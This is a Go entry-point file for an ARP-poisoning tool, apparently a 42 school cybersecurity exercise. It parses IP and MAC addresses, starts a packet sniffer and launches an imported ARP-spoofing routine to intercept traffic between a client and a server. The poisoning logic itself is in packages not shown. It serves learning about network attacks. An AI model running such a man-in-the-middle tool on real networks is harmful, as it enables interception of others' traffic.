package main

import (
	"log"
	"net"
	"os"
	"fmt"
	"bytes"
	"github.com/migueldar/42CyberSec_inquisitor/arpPoison"
	"github.com/migueldar/42CyberSec_inquisitor/sniffer"
)

//in charge of getting the arguments and turning them into byte arrays
func parse() ([][]byte, error) {
	args := os.Args
	if (len(args) != 7) {
		return nil, fmt.Errorf("Incorrect number of arguments, the structure must be: " +
			"<IPv4-source><MAC-source><IPv4-client><MAC-client><IPv4-server><MAC-server>")
	}
	var introduce []byte
	var err error
	bislice := make([][]byte, 6, 6)
	for i, v := range(args[1:]) {
		if i % 2 == 0 {
			introduce = net.ParseIP(v)
			if introduce == nil {
				return nil, fmt.Errorf("Invalid IP: %s\n", v)
			}
			introduce = net.IP(introduce).To4()
		} else {
			introduce, err = net.ParseMAC(v)
			if err != nil {
				return nil, err
			}
		}
		bislice[i] = introduce
	}
	return bislice, nil
}

func getInterface(srcMAC []byte) (*net.Interface, error) {
	allInterfaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for _, v := range(allInterfaces) {
		if bytes.Equal(v.HardwareAddr, srcMAC) {
			return &v, nil
		}
	}
	return nil, fmt.Errorf("Network interface not found for given MAC-src")
}

func main() {
	var err error
	args, err := parse()
	if err != nil {
		log.Fatal(err)
	}
	inter, err := getInterface(args[1])
	if err != nil {
		log.Fatal(err)
	}
	go sniffer.Sniffer(string (args[2]))
	arpPoison.Poison(args, inter)
}
